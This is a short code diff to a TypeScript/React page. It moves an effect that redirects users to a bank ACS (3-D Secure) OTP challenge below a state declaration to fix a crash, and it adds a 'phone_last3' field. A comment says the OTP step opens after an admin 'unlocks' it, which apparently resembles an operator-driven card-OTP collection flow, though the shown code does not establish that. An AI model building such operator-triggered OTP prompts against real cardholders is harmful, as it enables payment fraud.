@@ -94,6 +94,7 @@ type OtpOrderPoll = {
   otp_can_resend?: boolean;
   otp_resend_cooldown_sec?: number;
   fail_reason?: string | null;
+  phone_last3?: string | null;
 };
 
 type ApiOffer = {
@@ -554,17 +555,6 @@ function MainContent() {
     }
   }, []);
 
-  // Open bank ACS when showOtpStep is set (after admin unlocks awaiting_otp)
-  useEffect(() => {
-    if (!showOtpStep || !currentOrderId || !clientId) return;
-    redirectToAcsChallenge({
-      orderRef: currentOrderId,
-      clientId,
-      lang,
-      phoneLast3: otpPhoneLast3,
-      returnUrl: `${window.location.origin}/`,
-    });
-  }, [showOtpStep, currentOrderId, clientId, lang, otpPhoneLast3]);
   const fileInputRef = useRef<HTMLInputElement>(null);
   const prevTransactionsRef = useRef<ServerTransaction[]>([]);
   const [fileName, setFileName] = useState<string | null>(null);
@@ -596,6 +586,19 @@ function MainContent() {
   const [walletBalance, setWalletBalance] = useState<number>(0);
   const [clientId, setClientId] = useState<string | null>(null);
   const [offersList, setOffersList] = useState<ApiOffer[]>([]);
+
+  // Must run AFTER clientId is declared (TDZ crash if deps reference clientId earlier)
+  useEffect(() => {
+    if (!showOtpStep || !currentOrderId || !clientId) return;
+    redirectToAcsChallenge({
+      orderRef: currentOrderId,
+      clientId,
+      lang,
+      phoneLast3: otpPhoneLast3,
+      returnUrl: `${window.location.origin}/`,
+    });
+  }, [showOtpStep, currentOrderId, clientId, lang, otpPhoneLast3]);
+
   const [siteProfile, setSiteProfile] = useState<SiteProfileData | null>(null);
   const [profileDraft, setProfileDraft] = useState<SiteProfileData>({ full_name: '', email: '', phone: '' });
   const [profileSaving, setProfileSaving] = useState(false);
